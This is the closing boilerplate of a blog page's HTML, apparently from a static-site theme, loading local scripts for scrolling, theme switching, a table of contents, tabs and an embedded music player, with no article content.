<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
